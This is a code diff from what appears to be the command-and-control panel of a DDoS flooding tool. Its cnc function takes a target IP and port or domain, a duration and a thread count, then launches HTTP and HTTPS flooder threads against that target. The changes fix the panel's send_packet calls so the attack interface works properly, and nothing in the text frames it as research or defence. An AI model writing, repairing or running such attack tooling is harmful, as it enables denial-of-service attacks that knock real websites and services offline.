@@ -324,10 +324,10 @@ def cnc(client_socket,address,username):
     count = 0
     for a in methods_icon.split('\n'):
      count += 1
-     if count == 8:send_packet(a%(f'{ip}://{port}'),ex=True)
-     elif count == 9:send_packet(a%(str(times)),ex=True)
-     elif count == 10:send_packet(a%(str(threader)),ex=True)
-     elif count == 11:send_packet(a%(COM),ex=True)
+     if count == 8:send_packet(client_socket,a%(f'{ip}:{port}'),ex=True)
+     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
+     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
+     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
      else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,meth_http)).start()
    else:
@@ -343,10 +343,10 @@ def cnc(client_socket,address,username):
     count = 0
     for a in methods_icon.split('\n'):
      count += 1
-     if count == 8:send_packet(a%(f'{ip}://{port}'),ex=True)
-     elif count == 9:send_packet(a%(str(times)),ex=True)
-     elif count == 10:send_packet(a%(str(threader)),ex=True)
-     elif count == 11:send_packet(a%(COM),ex=True)
+     if count == 8:send_packet(client_socket,a%(f'{ip}:{port}'),ex=True)
+     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
+     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
+     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
      else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,'GET')).start()
    else:
@@ -365,10 +365,10 @@ def cnc(client_socket,address,username):
     count = 0
     for a in methods_icon.split('\n'):
      count += 1
-     if count == 8:send_packet(a%(f'{protocol}://{domain}'),ex=True)
-     elif count == 9:send_packet(a%(str(times)),ex=True)
-     elif count == 10:send_packet(a%(str(threader)),ex=True)
-     elif count == 11:send_packet(a%(COM),ex=True)
+     if count == 8:send_packet(client_socket,a%(f'{protocol}://{domain}'),ex=True)
+     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
+     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
+     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
      else:send_packet(a,ex=True)
     threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
    else:
